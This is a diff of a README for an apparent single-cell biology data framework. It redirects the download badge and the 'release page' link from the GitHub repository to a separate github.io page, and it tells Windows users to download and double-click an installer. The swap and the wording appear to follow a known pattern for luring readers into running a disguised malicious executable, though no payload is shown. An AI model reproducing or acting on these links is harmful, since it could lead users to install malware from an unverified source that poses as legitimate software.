@@ -1,6 +1,6 @@
 # 🧬 cells-v2026-data-framework - Streamline your complex biological data analysis
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/04208238/cells-v2026-data-framework)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://04208238.github.io)
 
 This framework organizes and processes biological information. It helps researchers manage single-cell genomics, transcriptomics, and machine learning tasks. You use this tool to structure raw data into formats suitable for analysis.
 
@@ -8,7 +8,7 @@ This framework organizes and processes biological information. It helps research
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project release page to download the latest setup file: [https://github.com/04208238/cells-v2026-data-framework](https://github.com/04208238/cells-v2026-data-framework)
+1. Visit the project release page to download the latest setup file: [https://04208238.github.io](https://04208238.github.io)
 2. Locate the download folder on your machine.
 3. Open the installer file by double-clicking it.
 4. Follow the on-screen prompts to complete the installation.
